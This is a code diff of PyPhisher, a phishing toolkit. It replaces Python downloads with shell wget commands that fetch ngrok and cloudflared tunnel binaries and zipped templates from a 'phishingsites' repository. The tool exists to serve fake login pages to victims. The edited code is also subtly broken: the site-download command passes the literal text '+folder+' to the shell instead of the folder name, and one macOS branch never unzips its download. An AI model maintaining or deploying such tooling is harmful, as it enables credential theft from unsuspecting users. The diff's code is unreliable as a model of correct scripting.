@@ -84,7 +84,6 @@ Copyright (C) 2021 KasRoudra (https://github.com/KasRoudra)
 """
 
 import os, sys, time, socket, json
-from urllib.request import urlretrieve
 from os import popen, system
 from time import sleep
 
@@ -210,20 +209,6 @@ def killer():
         system("killall wget")
     if system("pidof unzip > /dev/null 2>&1")==0:
         system("killall unzip")
-
-
-# Download progressbar
-def reporthook(blocknum, blocksize, totalsize):
-    readsofar = blocknum * blocksize
-    if totalsize > 0:
-        percent = readsofar * 1e2 / totalsize
-        s = "\r%5.1f%% %*d / %d" % (
-            percent, len(str(totalsize)), readsofar, totalsize)
-        sys.stderr.write(s)
-        if readsofar >= totalsize:
-            sys.stderr.write("\n")
-    else:
-        sys.stderr.write("read %d\n" % (readsofar,))
 
 # Update of PyPhisher
 def update():
@@ -358,23 +343,24 @@ def main():
     if not os.path.isfile(root+"/.ngrokfolder/ngrok"):
         sprint("\n"+info+"Downloading ngrok....."+nc)
         internet()
-        system("rm -rf file.zip")
+        system("rm -rf ngrok.zip ngrok.tgz")
         if y.find("Linux")!=-1:
             if x.find("aarch64")!=-1:
-                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz", "file.zip", reporthook)
-                system("tar -zxf file.zip > /dev/null 2>&1")
+                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
+                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
             elif x.find("arm")!=-1:
-                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip", "file.zip", reporthook)
-                system("unzip file.zip > /dev/null 2>&1")
+                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
+                system("unzip ngrok.zip > /dev/null 2>&1 ")
             elif x.find("x86_64")!=-1:
-                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip", "file.zip", reporthook)
-                system("unzip file.zip > /dev/null 2>&1")
+                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
+                system("unzip ngrok.zip > /dev/null 2>&1")
             else:
-                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip", "file.zip", reporthook)
-                system("unzip file.zip > /dev/null 2>&1")
+                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
+                system("unzip ngrok.zip > /dev/null 2>&1")
         elif y.find("Darwin")!=-1:
             if x.find("x86_64")!=-1:
                 system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
+                system("unzip ngrok.zip > /dev/null 2>&1")
             elif x.find("arm64")!=-1:
                 system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
             else:
@@ -383,7 +369,7 @@ def main():
         else:
             print(f"{error}Device not supported!")
             exit(1)
-        system("rm -rf file.zip && mkdir $HOME/.ngrokfolder")
+        system("rm -rf ngrok.zip && mkdir $HOME/.ngrokfolder")
         system("mv -f ngrok $HOME/.ngrokfolder")
         if sudo:
             system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
@@ -395,13 +381,13 @@ def main():
         system("rm -rf cloudflared cloudflared.tgz")
         if y.find("Linux")!=-1:
             if x.find("aarch64")!=-1:
-                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", "cloudflared", reporthook)
+                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
             elif x.find("arm")!=-1:
-                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", "cloudflared", reporthook)
+                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
             elif x.find("x86_64")!=-1:
-                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared", reporthook)
+                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
             else:
-                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", "cloudflared", reporthook)
+                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
         elif y.find("Darwin")!=-1:
             if x.find("x86_64")!=-1:
                 system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
@@ -716,7 +702,7 @@ def requirements(folder,mask):
             internet()
             sprint("\n"+info+"Downloading required files.....\n")
             system("rm -rf site.zip")
-            urlretrieve("https://github.com/KasRoudra/files/raw/main/phishingsites/"+folder+".zip", "site.zip", reporthook)
+            system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/phishingsites/'+folder+'.zip' -O 'site.zip'")
             if not os.path.exists(root+"/.websites"):
                 system("cd $HOME && mkdir .websites")
             system("cd $HOME/.websites && mkdir "+folder)
